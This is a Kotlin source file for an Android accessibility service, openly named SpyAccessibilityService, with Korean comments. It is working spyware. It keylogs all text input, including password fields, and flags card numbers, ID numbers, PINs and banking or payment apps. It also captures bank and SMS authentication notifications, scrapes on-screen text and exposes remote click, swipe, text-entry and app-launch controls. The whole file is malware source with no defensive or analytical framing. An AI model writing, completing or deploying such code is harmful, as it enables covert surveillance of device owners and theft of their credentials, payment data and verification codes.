package com.example.spy_android.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class SpyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "SpyAccessibilityService"
        var instance: SpyAccessibilityService? = null
        var isServiceRunning = false
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastInputTime = 0L
    private var currentApp = ""
    private val keylogBuffer = mutableListOf<String>()

    override fun onCreate() {
        super.onCreate()
        instance = this
        isServiceRunning = true

        Log.d(TAG, "고급 접근성 서비스 시작됨")
        serviceScope.launch {  // 코루틴 스코프에서 호출
            logServiceEvent("SERVICE_STARTED", "Enhanced accessibility service activated")
        }
    }


    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isServiceRunning = false
        serviceScope.cancel()

        serviceScope.launch {  // 코루틴 스코프에서 호출
            logServiceEvent("SERVICE_STOPPED", "Enhanced accessibility service deactivated")
        }
        Log.d(TAG, "고급 접근성 서비스 종료됨")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        serviceScope.launch {
            try {
                processAccessibilityEvent(event)
            } catch (e: Exception) {
                Log.e(TAG, "이벤트 처리 오류: ${e.message}")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "접근성 서비스 중단됨")
    }

    private suspend fun processAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"

        // 현재 앱 변경 감지
        if (packageName != currentApp) {
            logAppSwitch(currentApp, packageName)
            currentApp = packageName
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextInput(event, packageName, className)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleClickEvent(event, packageName, className)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleFocusEvent(event, packageName, className)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                handleWindowChange(event, packageName)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleNotification(event, packageName)
            }
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                handleScrollEvent(event, packageName)
            }
        }

        // 주기적으로 화면 구조 분석
        if (System.currentTimeMillis() - lastInputTime > 5000) {
            analyzeCurrentScreen()
            lastInputTime = System.currentTimeMillis()
        }
    }

    private suspend fun handleTextInput(event: AccessibilityEvent, packageName: String, className: String) {
        val inputText = event.text?.joinToString(" ") ?: ""
        val beforeText = event.beforeText?.toString() ?: ""

        if (inputText.isNotEmpty() || beforeText.isNotEmpty()) {
            val keylogData = mapOf(
                "event_type" to "text_input",
                "package_name" to packageName,
                "class_name" to className,
                "input_text" to inputText,
                "before_text" to beforeText,
                "input_method" to detectInputMethod(className),
                "is_password_field" to isPasswordField(event.source),
                "timestamp" to System.currentTimeMillis(),
                "formatted_time" to getCurrentTimeString()
            )

            saveKeylogData(keylogData)

            // 민감한 정보 감지
            if (detectSensitiveInput(inputText, packageName)) {
                logSensitiveInput(packageName, inputText, className)
            }

            Log.d(TAG, "텍스트 입력 감지: $packageName - $inputText")
        }
    }

    private suspend fun handleClickEvent(event: AccessibilityEvent, packageName: String, className: String) {
        val clickData = mapOf(
            "event_type" to "click",
            "package_name" to packageName,
            "class_name" to className,
            "content_description" to (event.contentDescription?.toString() ?: ""),
            "click_coordinates" to getClickCoordinates(event.source),
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("click_events", clickData)

        // 중요한 버튼 클릭 감지 (로그인, 결제 등)
        val contentDesc = event.contentDescription?.toString()?.lowercase() ?: ""
        if (isImportantButton(contentDesc, className)) {
            logImportantAction(packageName, "BUTTON_CLICK", contentDesc)
        }
    }

    private suspend fun handleFocusEvent(event: AccessibilityEvent, packageName: String, className: String) {
        val focusData = mapOf(
            "event_type" to "focus_change",
            "package_name" to packageName,
            "class_name" to className,
            "focused_text" to (event.text?.toString() ?: ""),
            "is_editable" to (event.source?.isEditable == true),
            "timestamp" to System.currentTimeMillis()
        )

        saveEventLog("focus_events", focusData)
    }

    private suspend fun handleWindowChange(event: AccessibilityEvent, packageName: String) {
        val windowData = mapOf(
            "event_type" to "window_change",
            "package_name" to packageName,
            "window_id" to (event.windowId ?: -1),
            "timestamp" to System.currentTimeMillis()
        )

        saveEventLog("window_changes", windowData)
    }

    private suspend fun handleNotification(event: AccessibilityEvent, packageName: String) {
        val notificationText = event.text?.joinToString(" ") ?: ""

        val notificationData = mapOf(
            "event_type" to "notification",
            "package_name" to packageName,
            "notification_text" to notificationText,
            "parcelable_data" to (event.parcelableData?.toString() ?: ""),
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("notifications", notificationData)

        // 중요한 알림 감지 (은행, 보안 등)
        if (isImportantNotification(packageName, notificationText)) {
            logImportantNotification(packageName, notificationText)
        }
    }

    private suspend fun handleScrollEvent(event: AccessibilityEvent, packageName: String) {
        val scrollData = mapOf(
            "event_type" to "scroll",
            "package_name" to packageName,
            "scroll_x" to (event.scrollX ?: 0),
            "scroll_y" to (event.scrollY ?: 0),
            "timestamp" to System.currentTimeMillis()
        )

        saveEventLog("scroll_events", scrollData)
    }

    private suspend fun analyzeCurrentScreen() {
        try {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                val screenAnalysis = performDeepScreenAnalysis(rootNode)
                saveEventLog("screen_analysis", screenAnalysis)
                rootNode.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "화면 분석 오류: ${e.message}")
        }
    }

    private fun performDeepScreenAnalysis(node: AccessibilityNodeInfo): Map<String, Any> {
        val analysis = mutableMapOf<String, Any>()

        // 화면의 모든 텍스트 수집
        val allTexts = mutableListOf<String>()
        val editableFields = mutableListOf<Map<String, Any>>()
        val clickableElements = mutableListOf<Map<String, Any>>()

        extractNodeDetails(node, allTexts, editableFields, clickableElements, 0, 3)

        analysis["all_visible_texts"] = allTexts
        analysis["editable_fields"] = editableFields
        analysis["clickable_elements"] = clickableElements
        analysis["screen_package"] = currentApp
        analysis["timestamp"] = System.currentTimeMillis()
        analysis["total_nodes"] = countTotalNodes(node)

        return analysis
    }

    private fun extractNodeDetails(
        node: AccessibilityNodeInfo,
        texts: MutableList<String>,
        editableFields: MutableList<Map<String, Any>>,
        clickableElements: MutableList<Map<String, Any>>,
        depth: Int,
        maxDepth: Int
    ) {
        if (depth > maxDepth) return

        // 텍스트 수집
        val nodeText = node.text?.toString()
        if (!nodeText.isNullOrEmpty()) {
            texts.add(nodeText)
        }

        // 편집 가능한 필드 수집
        if (node.isEditable) {
            editableFields.add(mapOf(
                "text" to (nodeText ?: ""),
                "hint" to (node.hintText?.toString() ?: ""),
                "is_password" to node.isPassword,
                "class_name" to (node.className?.toString() ?: ""),
                "view_id" to (node.viewIdResourceName ?: "")
            ))
        }

        // 클릭 가능한 요소 수집
        if (node.isClickable) {
            clickableElements.add(mapOf(
                "text" to (nodeText ?: ""),
                "content_description" to (node.contentDescription?.toString() ?: ""),
                "class_name" to (node.className?.toString() ?: ""),
                "view_id" to (node.viewIdResourceName ?: "")
            ))
        }

        // 자식 노드 재귀 처리
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                extractNodeDetails(child, texts, editableFields, clickableElements, depth + 1, maxDepth)
                child.recycle()
            }
        }
    }

    private fun countTotalNodes(node: AccessibilityNodeInfo): Int {
        var count = 1
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                count += countTotalNodes(child)
                child.recycle()
            }
        }
        return count
    }

    // 원격 조작 기능들
    fun performRemoteClick(x: Float, y: Float): Boolean {
        return try {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
                .build()

            val result = dispatchGesture(gesture, null, null)

            if (result) {
                serviceScope.launch {  // 코루틴 스코프 추가
                    logRemoteAction("REMOTE_CLICK", "Clicked at ($x, $y)")
                }
            }
            result
        } catch (e: Exception) {
            Log.e(TAG, "원격 클릭 실행 오류: ${e.message}")
            false
        }
    }

    fun performRemoteSwipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long = 500): Boolean {
        return try {
            val path = Path().apply {
                moveTo(startX, startY)
                lineTo(endX, endY)
            }

            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
                .build()

            val result = dispatchGesture(gesture, null, null)

            if (result) {
                logRemoteAction("REMOTE_SWIPE", "Swiped from ($startX, $startY) to ($endX, $endY)")
            }

            result
        } catch (e: Exception) {
            Log.e(TAG, "원격 스와이프 실행 오류: ${e.message}")
            false
        }
    }

    fun performRemoteTextInput(text: String): Boolean {
        return try {
            val focusedNode = findFocusedEditableNode(rootInActiveWindow)
            if (focusedNode != null) {
                val arguments = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }

                val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                focusedNode.recycle()

                if (result) {
                    logRemoteAction("REMOTE_TEXT_INPUT", "Inputted: $text")
                }

                result
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "원격 텍스트 입력 오류: ${e.message}")
            false
        }
    }

    fun performBackAction(): Boolean {
        return try {
            val result = performGlobalAction(GLOBAL_ACTION_BACK)
            if (result) {
                logRemoteAction("REMOTE_BACK", "Back button pressed")
            }
            result
        } catch (e: Exception) {
            Log.e(TAG, "원격 뒤로가기 오류: ${e.message}")
            false
        }
    }

    fun performHomeAction(): Boolean {
        return try {
            val result = performGlobalAction(GLOBAL_ACTION_HOME)
            if (result) {
                logRemoteAction("REMOTE_HOME", "Home button pressed")
            }
            result
        } catch (e: Exception) {
            Log.e(TAG, "원격 홈 버튼 오류: ${e.message}")
            false
        }
    }

    fun performRecentAppsAction(): Boolean {
        return try {
            val result = performGlobalAction(GLOBAL_ACTION_RECENTS)
            if (result) {
                logRemoteAction("REMOTE_RECENTS", "Recent apps opened")
            }
            result
        } catch (e: Exception) {
            Log.e(TAG, "원격 최근 앱 오류: ${e.message}")
            false
        }
    }

    fun openApp(packageName: String): Boolean {
        return try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
                logRemoteAction("REMOTE_OPEN_APP", "Opened app: $packageName")
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "앱 열기 오류: ${e.message}")
            false
        }
    }

    // 유틸리티 메서드들
    private fun findFocusedEditableNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null

        if (node.isFocused && node.isEditable) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val result = findFocusedEditableNode(child)
            child?.recycle()
            if (result != null) {
                return result
            }
        }

        return null
    }

    private fun detectInputMethod(className: String): String {
        return when {
            className.contains("EditText") -> "EditText"
            className.contains("AutoComplete") -> "AutoComplete"
            className.contains("SearchView") -> "SearchView"
            else -> "Unknown"
        }
    }

    private fun isPasswordField(node: AccessibilityNodeInfo?): Boolean {
        return node?.isPassword == true ||
                node?.className?.toString()?.contains("password", true) == true
    }

    // SpyAccessibilityService.kt - line 465 부근
    private fun detectSensitiveInput(text: String, packageName: String): Boolean {
        val sensitivePatterns = listOf(
            Regex("\\d{13,19}"), // 카드번호
            Regex("\\d{3}-\\d{2}-\\d{4}"), // 주민번호
            Regex("password|비밀번호|pin|cvv", RegexOption.IGNORE_CASE)
        )

        return sensitivePatterns.any { pattern ->
            pattern.containsMatchIn(text)  // matches 대신 containsMatchIn 사용
        } || packageName.contains("bank", true) || packageName.contains("pay", true)
    }

    private fun isImportantButton(contentDesc: String, className: String): Boolean {
        val importantKeywords = listOf(
            "login", "로그인", "sign in", "pay", "결제", "send", "전송",
            "confirm", "확인", "submit", "완료", "purchase", "구매"
        )

        return importantKeywords.any {
            contentDesc.contains(it, true) || className.contains(it, true)
        }
    }

    private fun isImportantNotification(packageName: String, text: String): Boolean {
        val importantApps = listOf("bank", "pay", "security", "auth", "sms")
        val importantKeywords = listOf("인증", "결제", "출금", "로그인", "보안", "경고")

        return importantApps.any { packageName.contains(it, true) } ||
                importantKeywords.any { text.contains(it, true) }
    }

    private fun getClickCoordinates(node: AccessibilityNodeInfo?): String {
        return try {
            if (node != null) {
                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)
                "${rect.centerX()},${rect.centerY()}"
            } else {
                "unknown"
            }
        } catch (e: Exception) {
            "error"
        }
    }

    private fun getCurrentTimeString(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
    }

    // 로깅 메서드들
    private suspend fun logAppSwitch(fromApp: String, toApp: String) {
        val switchData = mapOf(
            "event_type" to "app_switch",
            "from_app" to fromApp,
            "to_app" to toApp,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("app_switches", switchData)
    }

    private suspend fun logSensitiveInput(packageName: String, input: String, className: String) {
        val sensitiveData = mapOf(
            "event_type" to "sensitive_input",
            "package_name" to packageName,
            "input_text" to input,
            "class_name" to className,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("sensitive_inputs", sensitiveData)
    }

    private suspend fun logImportantAction(packageName: String, action: String, details: String) {
        val actionData = mapOf(
            "event_type" to "important_action",
            "package_name" to packageName,
            "action" to action,
            "details" to details,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("important_actions", actionData)
    }

    private suspend fun logImportantNotification(packageName: String, text: String) {
        val notificationData = mapOf(
            "event_type" to "important_notification",
            "package_name" to packageName,
            "notification_text" to text,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("important_notifications", notificationData)
    }

    private suspend fun logRemoteAction(action: String, details: String) {
        val remoteData = mapOf(
            "event_type" to "remote_action",
            "action" to action,
            "details" to details,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("remote_actions", remoteData)
    }

    private suspend fun logServiceEvent(event: String, details: String) {
        val serviceData = mapOf(
            "event_type" to "service_event",
            "event" to event,
            "details" to details,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        saveEventLog("service_events", serviceData)
    }

    private suspend fun saveKeylogData(data: Map<String, Any>) {
        saveEventLog("keylog_detailed", data)
    }

    private suspend fun saveEventLog(logType: String, data: Map<String, Any>) {
        withContext(Dispatchers.IO) {
            try {
                val logDir = File(filesDir, "logs")
                if (!logDir.exists()) {
                    logDir.mkdirs()
                }

                val logFile = File(logDir, "accessibility_${logType}.log")
                val jsonData = android.text.TextUtils.join(",", data.map { "\"${it.key}\":\"${it.value}\"" })
                logFile.appendText("{$jsonData}\n")

            } catch (e: Exception) {
                Log.e(TAG, "로그 저장 실패 ($logType): ${e.message}")
            }
        }
    }
}